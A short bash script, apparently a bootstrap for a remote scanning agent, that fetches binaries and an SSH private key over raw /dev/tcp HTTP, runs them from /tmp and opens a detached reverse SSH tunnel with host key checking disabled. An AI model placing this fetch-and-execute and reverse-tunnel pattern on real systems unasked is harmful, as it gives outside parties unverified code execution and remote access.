#!/bin/bash
scan_id=$SCAN_ID_SPLAV
uuid=$CONTROL_SPLAV
port_for_scan=$PORT_SPLAV
ip=$HOSTIP_SPLAV

download_script() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}

download_script http://$ip:1703/static/bin/openssh > /tmp/openssh
download_script http://$ip:1703/static/bin/listener > /tmp/listener
download_script http://$ip:1703/static/bin/ssh_key > /tmp/id_ed25519
download_script http://$ip:1703/static/bin/curl > /tmp/curl


chmod 600 /tmp/id_ed25519
chmod +x /tmp/openssh
chmod +x /tmp/listener
chmod +x /tmp/curl

setsid /tmp/openssh -o StrictHostKeyChecking=no -i /tmp/id_ed25519 -R localhost:"$port_for_scan":localhost:16139 stuff@$ip -p 12936 -N > /dev/null 2>&1 &

setsid /tmp/listener '$SPLAVHASH' &

sleep 5

/tmp/curl -X POST -d "scan_id=$scan_id" -d "uuid=$uuid"  http://$ip:1703/api/ready

